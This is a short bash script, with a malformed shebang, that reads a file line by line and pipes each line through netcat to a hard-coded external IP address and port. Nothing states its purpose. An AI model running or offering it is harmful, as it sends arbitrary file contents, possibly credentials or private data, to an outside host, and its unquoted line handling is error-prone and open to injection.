#/bin/bash

while IFS='' read -r line || [[ -n "$line" ]]; do
    printf "`echo $line`" | nc 183.61.70.221 11320 > /dev/null
done < "$1"
